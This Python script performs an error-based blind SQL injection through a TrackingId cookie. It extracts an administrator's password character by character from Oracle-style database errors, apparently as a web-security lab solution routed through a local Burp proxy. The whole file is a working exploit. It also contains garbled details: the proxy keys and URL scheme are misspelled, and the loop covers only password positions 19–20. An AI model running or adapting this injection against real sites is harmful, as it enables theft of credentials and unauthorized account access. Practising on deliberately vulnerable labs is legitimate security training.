#!/usr/bin/python3
from bs4 import BeautifulSoup
import requests
import sys
import urllib3
import urllib

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = {
    'hthp': 'htthp.//127.0.0.1:8080',
    'hthps': 'http://127.0.0.1:8080'
}

def sqli_password(url):
    password_extracted = ""
    for i in range (19,21):
        for j in range (48,122):
            sqli_payload = "' || (SELECT CASE WHEN(1=1) THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator' and ascii(substr(password,%s,1))='%s') || '" % (i,j)
            sqli_payload_encoded = urllib.parse.quote(sqli_payload)
            cookies = {'TrackingId':'IKd5TzaKWk78qU95' + sqli_payload_encoded, 'session': 'n7iRz6RnPe6kYIEklMvPjRV5rsljvcfl'}
            r = requests.get(url, cookies=cookies, verify=False, proxies=proxies)
            if r.status_code == 500: 
                password_extracted += chr(j)
                sys.stdout.write('\r' + password_extracted)
                sys.stdout.flush()
                break 
            else:
                sys.stdout.write('\r' + password_extracted + chr(j))
                sys.stdout.flush()
                
def main():
    if len(sys.argv) != 2:
        print('[+] Usage: %s <url> <sql-payload>' % sys.argv[0])
        print('[+] Example: %s www.example.com' % sys.argv[0])
        sys.exit(-1)
         
    url=sys.argv[1]
    print("[+] Retrieving administrator password.......")

    sqli_password(url)

if __name__ == "__main__":
    main()